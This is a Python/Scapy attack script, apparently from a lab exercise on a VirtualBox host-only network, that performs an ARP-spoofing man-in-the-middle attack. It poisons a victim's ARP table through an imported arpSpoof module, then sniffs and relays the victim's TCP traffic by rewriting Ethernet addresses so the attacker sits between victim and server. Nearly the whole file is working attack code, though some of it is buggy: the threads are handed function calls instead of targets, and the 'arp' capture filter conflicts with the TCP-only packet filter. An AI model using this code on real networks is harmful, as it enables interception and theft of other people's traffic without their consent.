from scapy.all import *
from scapy.layers.inet import IP, TCP
import threading
from threading import Lock
import arpSpoof
import util

lock = Lock()
networkInterface = "enp0s3"
victimIP = "192.168.56.101"
#victimMAC = "08:00:27:b0:a1:ab"

spoofIP = "192.168.56.102"
#serverMAC = "08:00:27:c6:a4:61"

#array for saving intersepted packets
interceptedPkt = []


# input : attacker MAC as str
# -target ip which has posioned arp tables  as str
# - array of ips which were posioned in victim table as array of str
# - network interface as str
# output:
# - send replay packet which will perform MIMA as follows
# - attacker will receive request from victim ip
# - performe that request and receive response from dst ip
# - and then send that resposne to the victim ip

def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):

    #lock threade to fill in arrays
    lock.acquire()
    victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
    serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP] # get array of MAC of poisoned ips in victim arp table
    lock.release()

    #filter to catch up only packets with TCP layer, distintaion to attacker MAC AND
    # with dist IP in the list of poisoned IP in victin arp table  OR
    # distination IP is victiM IP
    # input : intercepted packet
    def snifFilter(pkt):
        return (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
                pkt[IP].dst in spoofIP or pkt[IP].dst in victimIP))

    #input: intercepted packet
    # output : send response paket to the network
    def intercept(pkt):

        #update intercepted packet list
        interceptedPkt.append(pkt)

        #lock thread
        lock.acquire()

        #case 1: victim request an IP which has as destination MAC of attacker
        # find corresponding MAC to that IP in array of spoffed IPs and
        # put as destination to the new packet
        if pkt[IP].dst in  spoofIP:
            pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
        else:
            #case 2: server response for the request of the victim
            #so replace destination MAC to the MAC of victim
            pkt[Ether].dst = victimMAC

        #put src to attackerMAC as both arp tables of server and victim
        #maintain requested IP andresses under attacker MAC
        pkt[Ether].src = attackerMAC
        lock.release()

        #send packet to the network
        sendp(pkt, iface=networkInterface)

    #contineously sniff for the arp packet in network with before defined filter
    #on each intercepted packet perform intercep method
    sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifFilter)


# input :
# - target ip of device for poisoning arp table as array of str
# - target array of ip for spoofing as aray of str
# - network interface as str
# output ;
# - creates two threades
# - first thread poisoning arp table of target ip
# - second thread is performing forwarding of packets (MIMA)
def arp(victimIP, spoofIP, networkInterface):
    poisonThread = threading.Thread(target=arpSpoof.arpPoisoning(victimIP, spoofIP, networkInterface))
    poisonThread.daemon = True
    poisonThread.start()

    sniffThread = threading.Thread(target = arpSniffing(get_if_hwaddr(networkInterface), victimIP, spoofIP, networkInterface))
    sniffThread.daemon = True
    sniffThread.start()

#main method for executin forward attack
def main(victimIP, spoofIP, networkInterface):
    arp(victimIP, spoofIP, networkInterface)


main([victimIP],[spoofIP], networkInterface)